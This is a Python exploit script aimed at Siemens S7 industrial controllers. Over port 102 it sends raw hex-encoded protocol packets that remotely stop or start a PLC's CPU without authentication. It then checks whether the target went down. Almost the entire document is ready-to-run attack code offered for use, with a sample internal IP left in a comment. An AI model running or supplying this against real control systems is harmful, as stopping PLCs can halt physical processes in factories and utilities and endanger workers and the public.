
import socket
import time
import sys
from binascii import unhexlify

setup_communication_payload = '0300001902f08032010000020000080000f0000002000201e0'
cpu_start_payload = "0300002502f0803201000005000014000028000000000000fd000009505f50524f4752414d"
cpu_stop_payload = "0300002102f0803201000006000010000029000000000009505f50524f4752414d"


class Exploit(object):
     
    def __init__(self, ip, port, slot, command) -> None:
        self.target = ip  # 'Target address e.g. 192.168.1.1'
        self.port = port  # 'Target Port'
        self.slot = slot  # 'CPU slot number.'
        self.command = command  # 'Command 1:start plc, 2:stop plc.'
        self.sock = None
    # def __init__(self):
    #     # self.options = self.options
    #     self.options = ['slot', 'command', 'target', 'port']

    def create_connect(self, slot):
        slot_num = chr(slot)
        # print(type(slot_num))
        create_connect_payload = '0300001611e00000001400c1020100c2020102c0010a'
        # print(create_connect_payload)
        self.sock.send(unhexlify(create_connect_payload))
        self.sock.recv(1024)
        self.sock.send(unhexlify(setup_communication_payload))
        self.sock.recv(1024)

    def exploit(self):
        self.sock = socket.socket()
        self.sock.connect((self.target, self.port))
        self.create_connect(self.slot)
        self.command = int(self.command)
        if self.command == 1:
            print("Start plc")
            self.sock.send(unhexlify(cpu_start_payload))
        elif self.command == 2:
            print("Stop plc")
            self.sock.send(unhexlify(cpu_stop_payload))
        else:
            print("Command %s didn't support" % self.command)

    def run(self):
        if self._check_alive():
            print("Target is alive")
            print("Sending packet to target")
            self.exploit()
            if not self._check_alive():
                print("Target is down")
            print('Send command success')
        else:
            print("Target is not alive")


    # TODO: Add check later
    def check(self):
        pass

    def _check_alive(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target, self.port))
            sock.close()
        except Exception as e:
            print(e)
            return False
        return True


if __name__ == '__main__':
    # ip = "10.45.114.202"
    # port = 102
    # slot = 0
    # command = 2	
     ip      = str(sys.argv[1].strip())
     port    = int(sys.argv[2].strip())
     slot    = int(sys.argv[3].strip())
     command = int(sys.argv[4].strip())
     scan = Exploit(ip, port, slot, command)
     scan.run()
        
